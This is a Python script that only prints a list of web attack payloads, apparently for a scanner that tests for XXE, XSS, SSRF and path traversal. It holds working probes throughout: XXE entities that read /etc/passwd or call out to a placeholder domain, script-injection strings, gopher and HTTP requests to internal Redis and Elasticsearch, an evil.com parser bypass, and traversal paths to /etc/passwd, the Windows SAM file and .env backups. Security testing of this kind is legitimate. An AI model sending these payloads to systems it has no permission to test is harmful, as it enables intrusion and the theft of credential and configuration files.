#!/usr/bin/env python3
"""Generate missing payloads for XXE, XSS, SSRF, and Path Traversal.

Every payload produces a detectable signal: error, math (1337), timing, or OOB.
OOB payloads use {domain} as placeholder.
"""

PAYLOADS = r"""
##XXE - Error (DOCTYPE abuse)##
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///nonexistent1337">]><foo>&xxe;</foo>
##XXE - Error (recursive entity)##
<!DOCTYPE foo [<!ENTITY a "&#x26;b;"><!ENTITY b "1337">]><foo>&a;</foo>
##XXE - OOB (parameter entity)##
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{domain}/xxe-param">%xxe;]><foo>test</foo>
##XXE - OOB (parameter entity DTD)##
<!DOCTYPE foo SYSTEM "http://{domain}/xxe.dtd"><foo>test</foo>
##XXE - Error (CDATA extraction)##
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>
##XSS - Template Literal (backtick context)##
${alert(1337)}
`${alert(1337)}`
##XSS - DOM Clobbering##
<form id="x"><input name="action" value="javascript:alert(1337)"></form>
##XSS - CSP Bypass (base tag)##
<base href="http://{domain}/">
##XSS - Mutation XSS##
<noscript><p title="</noscript><img src=x onerror=alert(1337)>">
##XSS - Data URI##
<a href="data:text/html,<script>alert(1337)</script>">click</a>
##XSS - SVG with script##
<svg><script>alert(1337)</script></svg>
##SSRF - DNS Rebinding##
http://1337.oob.{domain}/
##SSRF - Open Redirect Chain##
http://localhost/redirect?url=http://{domain}/ssrf
##SSRF - Internal Service Probe (Redis)##
gopher://127.0.0.1:6379/_INFO%0d%0a
##SSRF - Internal Service Probe (Elasticsearch)##
http://127.0.0.1:9200/_cluster/health
##SSRF - IPv6 Zone ID Bypass##
http://[::1%25eth0]/
##SSRF - URL Parsing Bug (backslash)##
http://evil.com\@127.0.0.1/
##Path Traversal - Windows UNC##
\\{domain}\share\test
##Path Traversal - NTFS Alternate Data Stream##
....//....//etc/passwd::$DATA
##Path Traversal - Windows 8.3 Short Name##
..\..\WINDOW~1\system32\config\SAM
##Path Traversal - Backup Files##
.env.bak
config.php.bak
web.config.old
.git/HEAD
.svn/entries
##Path Traversal - API Context##
/api/v1/../../etc/passwd
/static/../../etc/passwd
""".strip()


def main():
    print(PAYLOADS)


if __name__ == "__main__":
    main()
